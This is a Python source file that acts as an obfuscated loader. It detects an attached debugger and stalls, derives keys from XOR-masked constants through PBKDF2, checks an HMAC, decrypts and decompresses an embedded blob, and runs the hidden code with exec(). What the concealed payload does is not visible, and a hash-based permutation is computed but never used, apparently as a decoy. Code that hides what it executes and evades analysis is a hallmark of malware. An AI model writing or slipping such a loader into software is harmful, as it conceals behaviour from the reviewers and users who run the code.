import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_c49a6c_0 = '6oUmEa0xx6uWMMlyqIbaFBuhn8OMS60vTHNFU1'
_c49a6c_1 = 'LirYhzPr8+1cw7kNq1wu+73TyTqqIszAFuYsSGHA=='
_pls = [_c49a6c_0, _c49a6c_1]
_4096c2 = [(64990,15207,2),(13050,37705,2),(65125,1549,2),(3205,31008,2),(2544,19096,2),(47468,21927,2),(64989,8864,2),(42576,55824,2),(23228,63740,2),(10803,1929,2),(60501,47389,2),(5496,20754,2),(35920,16456,2),(390,8889,2),(9439,55823,2),(55145,25671,2),(0,0,0),(0,0,0)]
_809571 = 'xrmhsw=='
_6f6cd8 = 'D0AhNuUPNKdwc7xF'
_400abf = 'lwHnfF4owQ8='
_76efe6 = [0, 1]
_salt = base64.b64decode(_400abf)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _76efe6
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_693d1a = base64.b64decode(_assembled)
_35b068 = 32
_c8e791 = _693d1a[:-_35b068]
_35b068 = _693d1a[-_35b068:]
_ffb2a4 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_4096c2)
_hdr = base64.b64decode(_809571)
_nonce = base64.b64decode(_6f6cd8)
_km_seed = hashlib.sha256(_ffb2a4 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _c8e791, hashlib.sha256).digest()
if _calc_tag != _35b068:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_c8e791)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_c8e791, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_309d0b'] = mmap
globals()['_4efdca'] = lambda i: globals()['_309d0b'][str(i)]
_x = globals()['_4efdca']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
